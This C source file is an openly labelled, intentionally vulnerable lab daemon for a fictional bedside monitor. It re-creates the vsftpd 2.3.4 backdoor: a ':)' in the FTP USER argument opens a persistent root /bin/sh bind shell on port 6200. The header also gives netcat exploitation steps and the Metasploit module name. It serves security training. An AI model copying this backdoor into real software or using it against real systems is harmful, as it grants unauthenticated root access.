/*
 * careotter-ftp.c — CareOtter bedside-monitor "field-service" FTP daemon.
 *
 * INTENTIONALLY VULNERABLE lab component. The monitor exposes a vendor
 * field-service FTP on TCP :21 (firmware and log transfer, already firewall-open
 * via 75-firewall.sh) running as root. The binary the vendor shipped is the
 * TROJANNED vsftpd 2.3.4 release (CVE-2011-2523, the 2011 supply-chain
 * compromise of the official vsftpd tarball): an FTP USER argument containing the
 * smiley ":)" arms a root /bin/sh on TCP :6200. This is a faithful, self-contained
 * re-implementation for training, NOT the upstream vsftpd source.
 *
 * Root cause class: hidden functionality / supply-chain backdoor (CWE-912) in an
 * unnecessary, outdated, internet-exposed service (CWE-1104). nmap -sV reveals the
 * vsftpd 2.3.4 banner -> public Metasploit module -> root.
 *
 * The daemon otherwise behaves like a real anonymous FTP server (so the
 * field-service narrative is concrete and the service is recognisable):
 *   - anonymous login only (USER anonymous|ftp; a named user is rejected 530)
 *   - PWD / CWD / TYPE / SYST / FEAT / PASV / LIST / NLST / RETR / QUIT over a
 *     small canned /firmware and /logs tree.
 *
 * Exploit (TWO terminals — the backdoor is a SEPARATE port, like the real CVE):
 *   term 1:  $ nc <pi> 21
 *            220 (vsFTPd 2.3.4)
 *            USER pwn:)          <- arms the backdoor on :6200
 *            331 Please specify the password.
 *   term 2:  $ nc <pi> 6200      <- fresh root shell, every time
 *            id  -> uid=0(root)
 *   Metasploit: exploit/unix/ftp/vsftpd_234_backdoor
 *
 * Reliability: the first ":)" trigger starts a PERSISTENT :6200 listener that
 * forks a root shell per connection (repeatable, never "connection refused").
 * A second trigger that hits EADDRINUSE is a silent no-op.
 *
 * Secure/vulnerable toggle: env CAREOTTER_FTP_SECURE (set by the init script from
 * UCI careotter.@careotter[0].ftp_secure). "1" disables the backdoor; the init
 * script also does not start the daemon at all (the I2 remediation: decommission
 * the unnecessary trojanned service).
 *
 * Build (OpenWRT 24.10.x SDK, aarch64 Cortex-A53 musl — same as careservice):
 *   aarch64-openwrt-linux-musl-gcc -O2 -static \
 *       -o files/opt/careotter-ftp/careotter-ftp careotter-ftp.c
 * Do NOT strip — nmap -sV / strings(1) must reveal "vsFTPd 2.3.4".
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define FTP_PORT        21
#define BACKDOOR_PORT   6200
#define FTP_BANNER      "220 (vsFTPd 2.3.4)\r\n"
#define VSFTPD_VERSION  "vsFTPd 2.3.4"     /* visible in strings(1) — do not strip */
#define LOGFILE         "/tmp/careotter-ftp.log"

static int g_secure = 0;   /* CAREOTTER_FTP_SECURE == "1" */

struct ftp_state {
    int  logged_in;
    char user[64];
    char cwd[128];
    int  data_listen;   /* PASV listening fd, -1 when none pending */
};

static void logmsg(const char *msg)
{
    FILE *f = fopen(LOGFILE, "a");
    if (!f) return;
    time_t t = time(NULL);
    char ts[32];
    strftime(ts, sizeof ts, "%Y-%m-%d %H:%M:%S", localtime(&t));
    fprintf(f, "%s %s\n", ts, msg);
    fclose(f);
}

static void send_str(int fd, const char *s) { (void)write(fd, s, strlen(s)); }

/*
 * THE BACKDOOR (vsftpd 2.3.4 / CVE-2011-2523). Persistent and reliable: the first
 * ":)" trigger forks a child that binds :6200 and accept-loops, forking a root
 * /bin/sh per connection. Every `nc <pi> 6200` gets a fresh shell, repeatable.
 * A later trigger that hits EADDRINUSE just exits (listener already up).
 */
static void arm_backdoor(void)
{
    if (fork() != 0) return;   /* caller (FTP handler) continues; child owns :6200 */

    int ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0) _exit(0);
    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);

    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_ANY);
    a.sin_port = htons(BACKDOOR_PORT);

    if (bind(ls, (struct sockaddr *)&a, sizeof a) < 0) { close(ls); _exit(0); } /* already armed */
    if (listen(ls, 8) < 0) { close(ls); _exit(0); }
    logmsg("backdoor: armed — persistent root shell on :6200 (vsftpd 2.3.4 CVE-2011-2523)");

    for (;;) {
        int cs = accept(ls, NULL, NULL);
        if (cs < 0) { if (errno == EINTR) continue; _exit(0); }
        if (fork() == 0) {
            close(ls);
            dup2(cs, 0);
            dup2(cs, 1);
            dup2(cs, 2);
            execl("/bin/sh", "sh", (char *)NULL);
            _exit(0);
        }
        close(cs);
    }
}

/* Open a PASV data channel: bind an ephemeral port, advertise it on the control
 * channel using the IP the client reached us on. */
static void cmd_pasv(int fd, struct ftp_state *st)
{
    if (st->data_listen >= 0) { close(st->data_listen); st->data_listen = -1; }

    int ds = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_ANY);
    a.sin_port = 0;
    if (ds < 0 || bind(ds, (struct sockaddr *)&a, sizeof a) < 0 || listen(ds, 1) < 0) {
        if (ds >= 0) close(ds);
        send_str(fd, "425 Cannot open data connection.\r\n");
        return;
    }
    socklen_t sl = sizeof a;
    getsockname(ds, (struct sockaddr *)&a, &sl);
    int port = ntohs(a.sin_port);

    struct sockaddr_in la;
    socklen_t ll = sizeof la;
    getsockname(fd, (struct sockaddr *)&la, &ll);
    unsigned char *ip = (unsigned char *)&la.sin_addr.s_addr;

    char buf[96];
    snprintf(buf, sizeof buf, "227 Entering Passive Mode (%d,%d,%d,%d,%d,%d)\r\n",
             ip[0], ip[1], ip[2], ip[3], (port >> 8) & 0xff, port & 0xff);
    send_str(fd, buf);
    st->data_listen = ds;
}

/* Send a body over the pending PASV data channel, then 226. */
static void data_send(int fd, struct ftp_state *st, const char *open_reply, const char *body)
{
    if (st->data_listen < 0) { send_str(fd, "425 Use PASV first.\r\n"); return; }
    send_str(fd, open_reply);
    int d = accept(st->data_listen, NULL, NULL);
    close(st->data_listen);
    st->data_listen = -1;
    if (d < 0) { send_str(fd, "426 Data connection failed.\r\n"); return; }
    (void)write(d, body, strlen(body));
    close(d);
    send_str(fd, "226 Transfer complete.\r\n");
}

static void cmd_list(int fd, struct ftp_state *st)
{
    const char *body;
    if (strstr(st->cwd, "firmware"))
        body = "-rw-r--r-- 1 root root 524288 Jan 01 12:00 firmware-1.4.2.bin\r\n";
    else if (strstr(st->cwd, "logs"))
        body = "-rw-r--r-- 1 root root  10240 Jan 01 12:00 vitals.log\r\n";
    else
        body = "drwxr-xr-x 2 root root 4096 Jan 01 12:00 firmware\r\n"
               "drwxr-xr-x 2 root root 4096 Jan 01 12:00 logs\r\n";
    data_send(fd, st, "150 Here comes the directory listing.\r\n", body);
}

static void cmd_retr(int fd, struct ftp_state *st, const char *arg)
{
    const char *body = NULL;
    if (strstr(arg, "firmware-1.4.2.bin"))
        body = "CAREOTTER-FW 1.4.2\nvendor=CareOtter Health\nbuild=20240115\n"
               "# field-service firmware image (lab placeholder)\n";
    else if (strstr(arg, "vitals.log"))
        body = "2026-06-01 12:00:00 bpm=72 spo2=98\n"
               "2026-06-01 12:00:10 bpm=74 spo2=97\n";
    if (!body) { send_str(fd, "550 Failed to open file.\r\n"); return; }
    data_send(fd, st, "150 Opening BINARY mode data connection.\r\n", body);
}

/*
 * FTP control handler — anonymous FTP plus the vsftpd 2.3.4 backdoor trigger.
 * One process per connection.
 */
static void handle_client(int fd)
{
    struct ftp_state st;
    memset(&st, 0, sizeof st);
    st.data_listen = -1;
    strcpy(st.cwd, "/");

    char line[512];
    send_str(fd, FTP_BANNER);

    for (;;) {
        ssize_t n = read(fd, line, sizeof line - 1);
        if (n <= 0) break;
        line[n] = '\0';
        char *crlf = strpbrk(line, "\r\n");
        if (crlf) *crlf = '\0';

        char *arg = strchr(line, ' ');
        if (arg) { *arg = '\0'; arg++; while (*arg == ' ') arg++; }
        else arg = line + strlen(line);   /* empty arg */

        if (strcasecmp(line, "USER") == 0) {
            snprintf(st.user, sizeof st.user, "%s", arg);
            /* The backdoor fires on the malicious username, before login completes,
             * exactly like the real CVE. The subsequent PASS still fails (the user
             * is not anonymous) but :6200 is already armed. */
            if (!g_secure && strstr(arg, ":)") != NULL) {
                logmsg("backdoor trigger: USER contains ':)' — arming :6200");
                arm_backdoor();
            }
            send_str(fd, "331 Please specify the password.\r\n");
        } else if (strcasecmp(line, "PASS") == 0) {
            if (strcasecmp(st.user, "anonymous") == 0 || strcasecmp(st.user, "ftp") == 0) {
                st.logged_in = 1;
                send_str(fd, "230 Login successful.\r\n");
            } else {
                send_str(fd, "530 Login incorrect.\r\n");
            }
        } else if (strcasecmp(line, "SYST") == 0) {
            send_str(fd, "215 UNIX Type: L8\r\n");
        } else if (strcasecmp(line, "FEAT") == 0) {
            send_str(fd, "211-Features:\r\n PASV\r\n211 End\r\n");
        } else if (strcasecmp(line, "QUIT") == 0) {
            send_str(fd, "221 Goodbye.\r\n");
            break;
        } else if (!st.logged_in) {
            send_str(fd, "530 Please login with USER and PASS.\r\n");
        } else if (strcasecmp(line, "PWD") == 0 || strcasecmp(line, "XPWD") == 0) {
            char b[160];
            snprintf(b, sizeof b, "257 \"%s\" is the current directory\r\n", st.cwd);
            send_str(fd, b);
        } else if (strcasecmp(line, "CWD") == 0) {
            snprintf(st.cwd, sizeof st.cwd, "%s", arg[0] ? arg : "/");
            send_str(fd, "250 Directory successfully changed.\r\n");
        } else if (strcasecmp(line, "TYPE") == 0) {
            send_str(fd, "200 Switching to the requested type.\r\n");
        } else if (strcasecmp(line, "PASV") == 0) {
            cmd_pasv(fd, &st);
        } else if (strcasecmp(line, "LIST") == 0 || strcasecmp(line, "NLST") == 0) {
            cmd_list(fd, &st);
        } else if (strcasecmp(line, "RETR") == 0) {
            cmd_retr(fd, &st, arg);
        } else {
            send_str(fd, "502 Command not implemented.\r\n");
        }
    }
    if (st.data_listen >= 0) close(st.data_listen);
}

int main(void)
{
    const char *s = getenv("CAREOTTER_FTP_SECURE");
    g_secure = (s && strcmp(s, "1") == 0) ? 1 : 0;
    logmsg(g_secure ? "starting (SECURE — backdoor disabled)"
                    : "starting (VULNERABLE — " VSFTPD_VERSION " backdoor active)");

    signal(SIGCHLD, SIG_IGN);   /* auto-reap forked handlers, shells and backdoor children */

    int ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0) { logmsg("FATAL: socket()"); return 1; }
    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);

    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_ANY);
    a.sin_port = htons(FTP_PORT);

    if (bind(ls, (struct sockaddr *)&a, sizeof a) < 0) { logmsg("FATAL: bind(:21)"); return 1; }
    if (listen(ls, 8) < 0) { logmsg("FATAL: listen()"); return 1; }
    logmsg("listening on 0.0.0.0:21 — banner '220 (" VSFTPD_VERSION ")'");

    for (;;) {
        int cs = accept(ls, NULL, NULL);
        if (cs < 0) { if (errno == EINTR) continue; break; }
        if (fork() == 0) {
            close(ls);
            handle_client(cs);
            close(cs);
            _exit(0);
        }
        close(cs);
    }
    return 0;
}
